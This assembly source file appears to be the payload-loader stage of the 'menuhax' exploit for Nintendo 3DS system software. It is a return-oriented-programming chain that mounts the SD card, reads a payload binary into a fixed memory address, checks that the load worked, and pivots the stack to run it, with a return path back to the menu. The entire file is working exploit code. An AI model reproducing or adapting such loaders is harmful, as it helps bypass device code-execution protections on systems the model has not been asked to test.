@ This is intended to be included by an exploit .s stage0/stage1.

#define menuhaxloader_tmpdata 0x0FFF0000
#define menuhaxloader_IFile_ctx (menuhaxloader_tmpdata+4)

#ifndef STAGE1
CALLFUNC_NOSP FS_MountSdmc, (HEAPBUF + (menuhaxloader_sd_archivename - _start)), 0, 0, 0
#endif

#ifdef STAGE1
@ Close the file-ctx from stage0, then clear the ctx.
ROPMACRO_IFile_Close menuhaxloader_IFile_ctx

CALLFUNC_NOSP MEMSET32_OTHER, menuhaxloader_IFile_ctx, 0x20, 0, 0
#endif

@ Load the file into the buffer.

CALLFUNC_NOSP IFile_Open, menuhaxloader_IFile_ctx, (HEAPBUF + (menuhaxloader_sdfile_path - _start)), 1, 0

CALLFUNC_NOSP IFile_Read, menuhaxloader_IFile_ctx, menuhaxloader_tmpdata, MENUHAXLOADER_LOAD_BINADDR, MENUHAXLOADER_LOAD_SIZE

#ifdef STAGE1
ROPMACRO_IFile_Close menuhaxloader_IFile_ctx
#endif

#ifdef STAGE1
@ Verify that the file was loaded successfully, on failure(first word in buf is 0x0) jump to menuhaxloader_returnaddr.
ROPMACRO_CMPDATA MENUHAXLOADER_LOAD_BINADDR, 0x0, ((HEAPBUF + (menuhaxloader_bootrop - _start))), 0x0
ROPMACRO_STACKPIVOT ((HEAPBUF + (menuhaxloader_returnaddr - _start))), ROP_POPPC
#endif

menuhaxloader_bootrop:
#ifdef STAGE1
@ Write the sp return-addr(menuhaxloader_returnaddr) used during ret2menu to buffer+4.
ROPMACRO_WRITEWORD (MENUHAXLOADER_LOAD_BINADDR+4), ((HEAPBUF + (menuhaxloader_returnaddr - _start)))
#endif

@ Jump to the buffer.
ROPMACRO_STACKPIVOT MENUHAXLOADER_LOAD_BINADDR, ROP_POPPC

#ifndef STAGE1
menuhaxloader_sd_archivename:
.string "sd:"
.align 2
#endif

menuhaxloader_sdfile_path:
.string16 MENUHAXLOADER_BINPAYLOAD_PATH
.align 2

menuhaxloader_returnaddr: @ The RET2MENU ROP starts here in the .s which included this menuhax_loader.s.

